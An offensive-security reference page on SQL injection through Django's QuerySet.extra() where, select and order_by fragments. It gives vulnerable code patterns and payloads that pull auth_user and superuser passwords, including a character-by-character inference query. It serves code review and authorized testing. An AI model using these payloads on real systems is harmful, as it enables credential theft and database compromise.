---
title: "Django extra() injection: select, where, and order_by clauses built from input"
description: QuerySet.extra() splices raw SQL fragments into select, where, tables, and order_by—when those fragments carry user input the result is SQL injection.
keywords:
  - Django ORM
  - extra() injection
  - select_extra
  - where_extra
  - order_by injection
  - SQL injection
---

# Django extra() injection

`QuerySet.extra()` is a legacy Django API that injects **raw SQL fragments** into specific parts of a query: `select=`, `where=`, `tables=`, `order_by=`, and `params=`. Each fragment is concatenated into the final statement, so any fragment built from untrusted input is a SQL injection sink. Django's own documentation warns that `extra()` is hard to use safely; in offensive review it is a reliable place to find injection.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable patterns

**`where` fragment** — the most direct sink:

```python
# q from the request
Entry.objects.extra(where=[f"headline LIKE '%{q}%'"])
```

**`select` fragment** — attacker controls a projected expression:

```python
Entry.objects.extra(select={"val": f"({user_expr})"})
```

**`order_by`** — column/direction cannot be parameterized, so interpolation is common:

```python
Entry.objects.extra(order_by=[request.GET["sort"]])
```

## Exploitation

**`where` injection** behaves like injection into a `WHERE` clause. Close the string/paren and add logic or a subquery:

```
%' OR '1'='1
%' UNION SELECT password FROM auth_user --
title',(SELECT password FROM auth_user LIMIT 1) AS stolen--
```

**`select` injection** lets you project an arbitrary scalar subquery into a column that the view then renders:

```
(SELECT password FROM auth_user WHERE is_superuser=true LIMIT 1)
```

**`order_by` injection** is a column-name context — no quotes to break out of. Use it for boolean/error/time inference or, on some backends, subselects in the sort expression:

```
(CASE WHEN (SELECT 1 FROM auth_user WHERE username='admin' AND SUBSTR(password,1,1)='a') THEN id ELSE headline END)
```

Because column/`order_by` contexts can't be parameterized at all, they stay injectable even when the developer "added quotes" elsewhere, making `extra()` a high-value target.

## References

- [Django docs: extra()](https://docs.djangoproject.com/en/stable/ref/models/querysets/#extra)
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
